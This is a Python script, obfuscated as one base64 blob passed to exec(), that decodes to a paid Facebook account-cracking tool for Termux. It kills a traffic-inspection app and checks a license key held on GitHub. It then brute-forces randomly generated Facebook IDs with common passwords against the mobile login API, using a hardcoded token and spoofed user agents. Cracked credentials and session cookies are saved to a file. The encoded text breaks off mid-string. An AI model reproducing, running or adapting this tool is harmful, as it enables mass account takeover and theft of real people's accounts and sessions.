import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKaW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHB5Y3VybApmcm9tIGlvIGltcG9ydCBCeXRlc0lPCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyByYWNlCmZyb20gc3RyaW5nIGltcG9ydCBkaWdpdHMsIGFzY2lpX2xldHRlcnMKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgYmFzZTY0CmltcG9ydCBjdHlwZXMKCnByaW50KCdceDFiWzE7OTFtW1x4MWJbMTs5N20tXHgxYlsxOzkxbV0gXHgxYlsxOzkybSBXRUxDT01FIFRPIFNZQ08gVE9PTCcpCm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS9ISEhaUHRRbEhYTUY5QkV1NkJxQVFIP21vZGU9YWNfdCcpCnRpbWUuc2xlZXAoMikKCmRlZiBydW5fc3lzdGVtX2NvbW1hbmQoY29tbWFuZCk6CiAgICBvcy5zeXN0ZW0oZid7Y29tbWFuZH0gPi9kZXYvbnVsbCAyPiYxJykKCnJ1bl9zeXN0ZW1fY29tbWFuZCgnY2htb2QgNzAwIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvYmluJykKcnVuX3N5c3RlbV9jb21tYW5kKCdwa2lsbCAtZiBodHRjYW5hcnknKQoKY2xhc3MgTmVidWxhQ29sb3JzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuVyA9ICdceDFiWzk3OzFtJwogICAgICAgIHNlbGYuUiA9ICdceDFiWzkxOzFtJwogICAgICAgIHNlbGYuRyA9ICdceDFiWzkyOzFtJwogICAgICAgIHNlbGYuWSA9ICdceDFiWzkzOzFtJwogICAgICAgIHNlbGYuQiA9ICdceDFiWzk0OzFtJwogICAgICAgIHNlbGYuUCA9ICdceDFiWzk1OzFtJwogICAgICAgIHNlbGYuQyA9ICdceDFiWzk2OzFtJwogICAgICAgIHNlbGYuTiA9ICdceDFiWzBtJwojIE9XTkVSIEJZIFNDUklQVCA6IE1SIE9HR1kKIyBHSVRIVUIgTElOSyA6IFNLQkVSLUNZQkVSCiMgTUFDSyBCWSA6IE1VSEFNTUFEIEpBS0FSSVlBIEhBU0FOCmltcG9ydCBvcywgdXVpZCwgYmFzZTY0LCByZXF1ZXN0cywgemxpYiwgdGltZSwgc3VicHJvY2Vzcwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpJRF9GSUxFID0gJy9jaG1vZCA3MDAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi8ub2dneS1sb2NrJwpkZWYgbWV5ZXh1ZGkoKToKICBvcy5zeXN0ZW0oJ2NsZWFyJykgCiAgdXVpZCA9ICJtciIrc3RyKG9zLmdldHVpZCgpKSsiU1lDTyIrc3RyKG9zLmdldHVpZCgpKSsiUEFJRC5UT09MIgogIGlkID0gJycuam9pbih1dWlkKQogIHRyeToKICAgIGh0dHBDYWh0ID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9naXRodWIuY29tL3N5Y29icmFuZDAwNy9BcHByb3ZlbC50eHQvYmxvYi9tYWluL2FwcHJvdmVsLnR4dCIpLnRleHQKICAgIGlmIGlkIGluIGh0dHBDYWh0OgogICAgICBtc2cgPSBzdHIob3MuZ2V0ZXVpZCgpKQogICAgICBwcmludCgpCiAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVreKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVricpCiAgICAgIHByaW50KGYnIFx4MWJbMTszMm3ilZFb8J2ft11LZXk6IHtpZH0nKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSBGVUxMIEhBVlkgTE9HSU4gV0FSUkFOVFknKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSBPTkxZIEFDVElWRSBJRCBDTE9ORSAxMDAlJykKICAgICAgcHJpbnQoJyBceDFiWzE7MzJt4pWRW+KAol0gSUQgV0lMTCBCRSBMT0dJTiA4MCUnKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSBXSS1GSSAgQU5EIERBVEEgQk9USCBXT1JLSU5HIDEwMCUnKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSAgNyBEQVkgMjAwIFJTICcpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVkVvigKJdIDE1IERBWSA0MDAgUnMgJykKICAgICAgcHJpbnQoJyBceDFiWzE7MzJt4pWRW+KAol0gMzAgREFZIDgwMCBScyAnKQogICAgICBwcmludChmJyBceDFiWzE7MzJt4pWRW0tFWV06IHtpZH0nKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDila8nKQogICAgICB1bmFtZSA9aW5wdXQoJ1wwMzNbMTs5N21bXDAzM1sxOzkybeKAolwwMzNbMTs5N21dXDAzM1sxOzkybSBXSEFUIElTIFlPVVIgTkFNRSBcMDMzWzE7OTFtOiBcMzNbMTszMm0nKQogICAgICBpbnB1dCgnIFwwMzNbMTszMG3ilZrilZDilZBb4oCiXSBJRiBVIFdBTlQgQVBQUk9WQUwgVEhFTiBQUkVTUyBFTlRFUiAnKQogICAgICB0a3MgPSAoJ0hlbGxvJTIwU2lyJTIwISUyMFBsZWFzZSUyMEFwcHJvdmUlMjBNeSUyMFRva2VuJTIwVGhlJTIwVG9rZW4lMjBJcyUyMDolMjAnK2lkKTtvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzkyMzA4MjAxOTE1MD90ZXh0PScrdGtzKSxhcHByb3ZhbCgpICAgICAgIAogIGV4Y2VwdDoKICAgIHN5cy5leGl0KCkKbWV5ZXh1ZGkoKQpkZWYgcHJvX2Jhbm5lcigpOgogICAgcmV0dXJuICIiIgpceDFiWzE7OTZtCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilZEgIOKWkeKWiOKWiOKWiOKWiOKWiOKWiCAgIOKWkeKWiOKWiCAgICAg4paR4paI4paIICAg4paR4paI4paI4paI4paI4paI4paIICAgIOKWkeKWiOKWiOKWiOKWiOKWiOKWiCAgIOKVkQrilZEg4paR4paI4paIICAg4paR4paI4paIICAg4paR4paI4paIICAg4paR4paI4paIICAg4paR4paI4paIICAg4paR4paI4paIICDilpHilojiloggICDilpHilojiloggIOKVkQrilZHilpHilojiloggICAgICAgICAgIOKWkeKWiOKWiCDilpHilojiloggICDilpHilojiloggICAgICAgIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKVkQrilZEg4paR4paI4paI4paI4paI4paI4paI4paI4paIICAgICDilpHilojilojilojiloggICAg4paR4paI4paIICAgICAgICDilpHilojiloggICAgIOKWkeKWiOKWiCDilZEK4pWRICAgICAgICDilpHilojiloggICAgIOKWkeKWiOKWiCAgICAg4paR4paI4paIICAgICAgICDilpHilojiloggICAgIOKWkeKWiOKWiCDilZEK4pWRIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgICAgIOKWkeKWiOKWiCAgICAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAg4paR4paI4paIICAg4paR4paI4paIICDilZEK4pWRICDilpHilojilojilojilojilojiloggICAgICAg4paR4paI4paIICAgICAgIOKWkeKWiOKWiOKWiOKWiOKWiOKWiCAgICDilpHilojilojilojilojilojiloggICDilZEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdClx4MWJbMTs5Nm0g4p6k4pWRIFx4MWJbMTs5N21DcmVhdG9yIOKVkSBIYXNzYW4KXHgxYlsxOzk2bSDinqTilZEgXHgxYlsxOzk3bVZlcnNpb24g4pWRIDAuNgpceDFiWzE7OTZtIOKepOKVkSBceDFiWzE7OTdtU3RhdHVzICDilZEgUHJlbWl1bSBUb29sClx4MWJbMTs5Nm0g4p6k4pWRIFx4MWJbMTs5N21Ub29sICAgIOKVkSBTeWNvLVRyaWNrZXIgRnJlZSBFbmpveSAKXHgxYlsxOzkybeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIiIgoKZGVmIGxpbmV4KCk6CiAgICBjb2xvciA9IE5lYnVsYUNvbG9ycygpCiAgICBwcmludChmIntjb2xvci5QfeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpCgpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQocHJvX2Jhbm5lcigpKQoKZGVmIHNlY3VyZV94b3IoZGF0YSwga2V5PTg1KToKICAgIHJldHVybiBieXRlcyhbYiBeIGtleSBmb3IgYiBpbiBkYXRhXSkKCmRlZiBnZXRfaGlkZGVuX3VybCgpOgogICAgcGFydHMgPSBbCiAgICAgICAgc2VjdXJlX3hvcihiJ2h0dHBzOi8vJyksCiAgICAgICAgc2VjdXJlX3hvcihiJ2dpdGh1Yi5jb20vJyksCiAgICAgICAgc2VjdXJlX3hvcihiJzEtTkFMTEEvJyksCiAgICAgICAgc2VjdXJlX3hvcihiJ0ppbm5fQXBwLycpLAogICAgICAgIHNlY3VyZV94b3IoYidibG9iL21haW4vJyksCiAgICAgICAgc2VjdXJlX3hvcihiJ0FwcC50eHQnKQogICAgXQogICAgcmV0dXJuIGIiIi5qb2luKHNlY3VyZV94b3IocGFydCkgZm9yIHBhcnQgaW4gcGFydHMpLmRlY29kZSgpCgpjbGFzcyBVc2VyQWdlbnRHZW5lcmF0b3I6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5jdXN0b21fdXNlcl9hZ2VudHMgPSBbCiAgICAgICAgICAgICJbRkJBTi9GQjRBO0ZCQVYvMzUxLjAuMC4zOC4xMTc7RkJCVi8zMTAyMTgxODg7RkJETS97ZGVuc2l0eT0yLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjQwMH07RkJMQy9lbl9VUztGQlJWL1Zlcml6b247RkJNRi9TYW1zdW5nO0ZCQkQvU2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9TTS1BNzE1RjtGQlNWLzEzO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTtdIiwKICAgICAgICBdCgogICAgZGVmIF9nZW5lcmF0ZV9tb3ppbGxhX3VzZXJfYWdlbnQoc2VsZik6CiAgICAgICAgYW5kcm9pZF92ZXJzaW9uID0gcmFuZG9tLnJhbmRpbnQoNCwgMTMpCiAgICAgICAgZGV2aWNlID0gcmFuZG9tLmNob2ljZSgoJ1NNLUc5MDBGJywgJ1NNLUc5MjBGJywgJ1NNLVQ1MzUnLCAnU00tVDIzMScsICdTTS1KMzIwRicsICdHVC1JOTE5MCcpKQogICAgICAgIHJlc29sdXRpb24gPSByYW5kb20uY2hvaWNlKCgne2RlbnNpdHk9MS41LHdpZHRoPTcyMCxoZWlnaHQ9MTI4MH0nLCAne2RlbnNpdHk9My41LHdpZHRoPTE0NDAsaGVpZ2h0PTMwNDB9JykpCiAgICAgICAgY2hyb21lX3ZlcnNpb24gPSBmIntyYW5kb20ucmFuZGludCgxMDAsIDE1MCl9LjAuMC4wIgogICAgICAgIHJldHVybiBmIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YW5kcm9pZF92ZXJzaW9ufTsge2RldmljZX0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS97Y2hyb21lX3ZlcnNpb259IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFt7cmVzb2x1dGlvbn1dIgoKICAgIGRlZiBnZW5lcmF0ZV91c2VyX2FnZW50KHNlbGYpOgogICAgICAgIHVzZXJfYWdlbnRfdHlwZSA9IHJhbmRvbS5jaG9pY2UoKCdNb3ppbGxhJywgJ0ZhY2Vib29rJywgJ0RhbHZpaycsICdpUGhvbmUnLCAnQ3VzdG9tJykpCiAgICAgICAgaWYgdXNlcl9hZ2VudF90eXBlID09ICdNb3ppbGxhJzoKICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2dlbmVyYXRlX21vemlsbGFfdXNlcl9hZ2VudCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIHJhbmRvbS5jaG9pY2Uoc2VsZi5jdXN0b21fdXNlcl9hZ2VudHMpCgogICAgZGVmIGxvYWRfdXNlcl9hZ2VudHNfZnJvbV91cmwoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgcmVxdWVzdHMKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90cnQtRmlyZS9kYXRhL21haW4vdWEudHh0JykKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnRleHQuc3BsaXRsaW5lcygpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIFtdCgpjbGFzcyBTWUNPQ3JhY2tlcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLm9rcyA9IFtdCiAgICAgICAgc2VsZi5jcHMgPSBbXQogICAgICAgIHNlbGYubG9vcCA9IDAKICAgICAgICBzZWxmLmNvbG9yID0gTmVidWxhQ29sb3JzKCkKICAgICAgICBzZWxmLnVzZXJfYWdlbnRzID0gVXNlckFnZW50R2VuZXJhdG9yKCkubG9hZF91c2VyX2FnZW50c19mcm9tX3VybCgpCgogICAgZGVmIG9sZF9tZW51KHNlbGYpOgogICAgICAgIGNsZWFyKCkKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB9IHtzZWxmLmNvbG9yLkN9WzFdIHtzZWxmLmNvbG9yLkd9Q1JBQ0sgMjAwOSBBQ0NPVU5UUyAgICAgICAgICAgICAgICAge3NlbGYuY29sb3IuUH0iKQogICAgICAgIHByaW50KGYie3NlbGYuY29sb3IuUH0ge3NlbGYuY29sb3IuQ31bMl0ge3NlbGYuY29sb3IuR31DUkFDSyAyMDA5LTIwMTMgQUNDT1VOVFMgICAgICAgICAgICB7c2VsZi5jb2xvci5QfSIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5jb2xvci5QfSB7c2VsZi5jb2xvci5DfVswXSB7c2VsZi5jb2xvci5SfeKHpiBCQUNLIFRPIE1BSU4gTUVOVSAgICAgICAgICAgICAgICAge3NlbGYuY29sb3IuUH0iKQogICAgICAgIHByaW50KGYie3NlbGYuY29sb3IuUH3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQoKICAgICAgICBjaG9pY2UgPSBpbnB1dChmIiAge3NlbGYuY29sb3IuQ31ceDFiWzE7OTZtIOKepCBDaG9vc2U6IHtzZWxmLmNvbG9yLld9Iikuc3RyaXAoKQogICAgICAgIAogICAgICAgIGlmIGNob2ljZSBpbiAoJzEnLCAnMDEnKToKICAgICAgICAgICAgc2VsZi5leGVjdXRlX2JyZWFjaCgnMTAwMDAwJykKICAgICAgICBlbGlmIGNob2ljZSBpbiAoJzInLCAnMDInKToKICAgICAgICAgICAgc2VsZi5xdWFudHVtX2JyZWFjaF9tZW51KCkKICAgICAgICBlbGlmIGNob2ljZSBpbiAoJzAnLCAnMDAnKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJcbiAge3NlbGYuY29sb3IuUn3imqAgSW52YWxpZCBjaG9pY2UhIikKICAgICAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgICAgICBzZWxmLm9sZF9tZW51KCkKCiAgICBkZWYgcXVhbnR1bV9icmVhY2hfbWVudShzZWxmKToKICAgICAgICBjbGVhcigpCiAgICAgICAgc2VyaWVzX21hcCA9IHsKICAgICAgICAgICAgJzEnOiAnMTAwMDAwJywgJzInOiAnMTAwMDAxJywgJzMnOiAnMTAwMDAyJywgCiAgICAgICAgICAgICc0JzogJzEwMDAwMycsICc1JzogJzEwMDAwNCcKICAgICAgICB9CiAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLld9XHgxYlsxOzk2bSDinqQgU2VsZWN0IFNlcmllczoiKQogICAgICAgIGZvciBudW0sIHByZWZpeCBpbiBzZXJpZXNfbWFwLml0ZW1zKCk6CiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVt7c2VsZi5jb2xvci5HfXtudW19e3NlbGYuY29sb3IuV31dIHtzZWxmLmNvbG9yLkN9e3ByZWZpeH0iKQogICAgICAgIAogICAgICAgIGxpbmV4KCkKICAgICAgICBjaG9pY2UgPSBpbnB1dChmIiAge3NlbGYuY29sb3IuQ31ceDFiWzE7OTZtIOKepCBDaG9vc2U6IHtzZWxmLmNvbG9yLld9Iikuc3RyaXAoKQogICAgICAgIHNlbGVjdGVkX3ByZWZpeCA9IHNlcmllc19tYXAuZ2V0KGNob2ljZSkKCiAgICAgICAgaWYgbm90IHNlbGVjdGVkX3ByZWZpeDoKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgU2VyaWVzISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5xdWFudHVtX2JyZWFjaF9tZW51KCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgc2VsZi5leGVjdXRlX2JyZWFjaChzZWxlY3RlZF9wcmVmaXgpCgogICAgZGVmIGV4ZWN1dGVfYnJlYWNoKHNlbGYsIHByZWZpeCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGVhcigpCiAgICAgICAgICAgIGxpbWl0ID0gaW50KGlucHV0KGYiICB7c2VsZi5jb2xvci5HfVx4MWJbMTs5Nm0g4p6kIEVudGVyIExpbWl0OiB7c2VsZi5jb2xvci5XfSIpKQogICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuUn3imqAgSW52YWxpZCBOdW1iZXIhIikKICAgICAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgICAgICBzZWxmLm9sZF9tZW51KCkKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHRhcmdldHMgPSBbcHJlZml4ICsgJycuam9pbihyYW5kb20uY2hvaWNlcyhkaWdpdHMsIGs9OSkpIGZvciBfIGluIHJhbmdlKGxpbWl0KV0KICAgICAgICBwYXNzbGlzdCA9IFsnMTIzNDU2Nzg5JywgJzEyMzQ1NicsICcxMjM0NTY3OCcsICcxMjM0NTY3JywgJzEyMzQ1Njc4OTAnXQoKICAgICAgICB3aXRoIHRyZWQobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBjbGVhcigpCiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVx4MWJbMTs5Nm1VU0lORyBTRVJJRVMgOntzZWxmLmNvbG9yLll9e3ByZWZpeH0gIikKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLld9XHgxYlsxOzk2bVRPVEFMIEFDQ09VTlQ6IHtzZWxmLmNvbG9yLkd9e2xlbih0YXJnZXRzKX0iKQogICAgICAgICAgICBsaW5leCgpCiAgICAgICAgICAgIGZvciB0YXJnZXQgaW4gdGFyZ2V0czoKICAgICAgICAgICAgICAgIGV4ZWN1dG9yLnN1Ym1pdChzZWxmLmJyZWFjaF90YXJnZXQsIHRhcmdldCwgcGFzc2xpc3QpCiAgICAgICAgCiAgICAgICAgc2VsZi5kaXNwbGF5X3Jlc3VsdHMoKQoKICAgIGRlZiBicmVhY2hfdGFyZ2V0KHNlbGYsIHRhcmdldCwgcGFzc2xpc3QpOgogICAgICAgIHNlbGYubG9vcCArPSAxCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyICB7c2VsZi5jb2xvci5XfVtTWUNPXSB7c2VsZi5sb29wfXx7c2VsZi5jb2xvci5SfXtsZW4oc2VsZi5va3MpfXx7c2VsZi5jb2xvci5HfXtsZW4oc2VsZi5jcHMpfXtzZWxmLmNvbG9yLld9JykKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBmb3IgcGFzc3dvcmQgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIGlmIHNlbGYudHJ5X2JyZWFjaCh0YXJnZXQsIHBhc3N3b3JkKToKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgZGVmIHRyeV9icmVhY2goc2VsZiwgdWlkLCBwYXNzd29yZCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2Uoc2VsZi51c2VyX2FnZW50cykKICAgICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6IHVhLAogICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgJ0hvc3QnOiAnZ3JhcGguZmFjZWJvb2suY29tJywKICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogJ09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM0Rpb3IyMzQzN2E0YTMyJywKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICAgICAgICdhZGlkJzogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ2pzb24nLAogICAgICAgICAgICAgICAgJ2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICAgICAgICAgJ2VtYWlsJzogdWlkLAogICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJzogcGFzc3dvcmQsCiAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLAogICAgICAgICAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZW5jb2RlZF9wYXlsb2FkID0gdXJsbGliLnBhcnNlLnVybGVuY29kZShwYXlsb2FkKQogICAgICAgICAgICBidWZmZXIgPSBCeXRlc0lPKCkKICAgICAgICAgICAgYyA9IHB5Y3VybC5DdXJsKCkKICAgICAgICAgICAgYy5zZXRvcHQoYy5VUkwsICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luJykKICAgICAgICAgICAgYy5zZXRvcHQoYy5QT1NULCAxKQogICAgICAgICAgICBjLnNldG9wdChjLlBPU1RGSUVMRFMsIGVuY29kZWRfcGF5bG9hZCkKICAgICAgICAgICAgYy5zZXRvcHQoYy5XUklURURBVEEsIGJ1ZmZlcikKICAgICAgICAgICAgYy5zZXRvcHQoYy5USU1FT1VULCAxMCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcl9saXN0ID0gW2Yie2tleX06IHt2YWx1ZX0iIGZvciBrZXksIHZhbHVlIGluIGhlYWRlcnMuaXRlbXMoKV0KICAgICAgICAgICAgYy5zZXRvcHQoYy5IVFRQSEVBREVSLCBoZWFkZXJfbGlzdCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGMucGVyZm9ybSgpCiAgICAgICAgICAgIHJlc3BvbnNlX2JvZHkgPSBidWZmZXIuZ2V0dmFsdWUoKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICAgICAgcmVzcG9uc2UgPSBqc29uLmxvYWRzKHJlc3BvbnNlX2JvZHkpCiAgICAgICAgICAgIGMuY2xvc2UoKQogICAgICAgICAgICBidWZmZXIuY2xvc2UoKQoKICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZToKICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlX3N1Y2Nlc3ModWlkLCBwYXNzd29yZCwgcmVzcG9uc2UpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5nZXQoJ2Vycm9yJywge30pLmdldCgnbWVzc2FnZScsICcnKToKICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlX3BhcnRpYWwodWlkLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIGhhbmRsZV9zdWNjZXNzKHNlbGYsIHVpZCwgcGFzc3dvcmQsIHJlc3BvbnNlKToKICAgICAgICBjb2tpID0gJzsnLmpvaW4oW2Yie2NbJ25hbWUnXX09e2NbJ3ZhbHVlJ119IiBmb3IgYyBpbiByZXNwb25zZS5nZXQoJ3Nlc3Npb25fY29va2llcycsIFtdKV0pCiAgICAgICAgcHJpbnQoZiJcciAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtICAg4p6kIFNVQ0NFU1Mge3NlbGYuY29sb3IuV317dWlkfXx7c2VsZi5jb2xvci5HfXtwYXNzd29yZH17c2VsZi5jb2xvci5XfSIpCiAgICAgICAgd2l0aCBvcGVuKCcvc2RjYXJkL1NZQ08tT0xELnR4dCcsICdhJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShmJ3t1aWR9fHtwYXNzd29yZH18e2Nva2l9XG4nKQogICAgICAgIHNlbGYub2tzLmFwcGVuZCh1aWQpCgogICAgZGVmIGhhbmRsZV9wYXJ0aWFsKHNlbGYsIHVpZCwgcGFzc3dvcmQpOgogICAgICAgIHByaW50KGYiXHIgIHtzZWxmLmNvbG9yLll9XHgxYlsxOzkwbSAgIFtTWUNPXSB7c2VsZi5jb2xvci5HfXt1aWR9e3NlbGYuY29sb3IuWX3igKJceDFiWzE7OTBte3Bhc3N3b3JkfXtzZWxmLmNvbG9yLld9IikKICAgICAgICB3aXRoIG9wZW4oJy9zZGNhcmQvU1lDTy1PTEQudHh0JywgJ2EnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGYne3VpZH18e3Bhc3N3b3JkfVxuJykKICAgICAgICBzZWxmLmNwcy5hcHBlbmQodWlkKQogICAgICAgIAogICAgZGVmIGRpc3BsYXlfcmVzdWx0cyhzZWxmKToKICAgICAgICBjbGVhcigpCiAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLkd9XHgxYlsxOzk2bSAgIOKepCBDUkFDS0lORyBDT01QTEVURSIpCiAgICAgICAgbGluZXgoKQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfUNQOiB7c2VsZi5jb2xvci5ZfXtsZW4oc2VsZi5va3MpfSIpCiAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLld9T0s6IHtzZWxmLmNvbG9yLkd9e2xlbihzZWxmLmNwcyl9IikKICAgICAgICBsaW5leC